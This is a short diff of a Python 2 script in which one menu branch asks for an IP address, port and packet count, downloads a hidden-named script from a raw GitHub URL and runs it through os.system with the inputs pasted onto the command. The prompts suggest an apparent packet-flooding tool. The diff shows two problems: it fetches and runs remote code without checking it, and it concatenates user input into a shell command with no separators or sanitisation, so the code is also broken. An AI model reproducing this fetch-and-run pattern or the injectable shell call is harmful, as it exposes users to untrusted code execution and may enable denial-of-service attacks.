@@ -45,9 +45,12 @@ if hama == '393389':
 	
 	
 elif hama == '1':
+        ip = raw_input("ip Dane:")
+        port = raw_input("Port:")
+        packet = raw_input("packet:")
 	down = "https://raw.githubusercontent.com/hh119191955/299292827uee/main/.dddd92.py"
 	wget.download(down)
-	os.system("python2 .dddd92.py")
+	os.system("python2 .dddd92.py" + ip + port + packet)
 	
 	
 	
